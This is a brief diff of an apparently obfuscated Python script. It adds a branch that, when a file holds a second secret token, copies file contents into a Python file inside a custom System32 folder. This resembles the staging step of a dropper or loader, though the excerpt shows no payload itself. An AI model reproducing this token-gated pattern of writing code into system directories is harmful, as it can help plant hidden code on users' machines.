@@ -247,6 +247,9 @@ if file_contentsx1=="deleteaesFILES":
 if file_contentsx1 =="04yb8u5ih5FGB":
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
     create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
+elif file_contentsx1 =="NXXzPhXpkZ9JC":
+    file_contentpathx = read_file_contentxasxas(file_pathxpath)
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.6.py")
 else:
     create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\AesV8.6.py")
 def run_batch_file(batch_file_path):
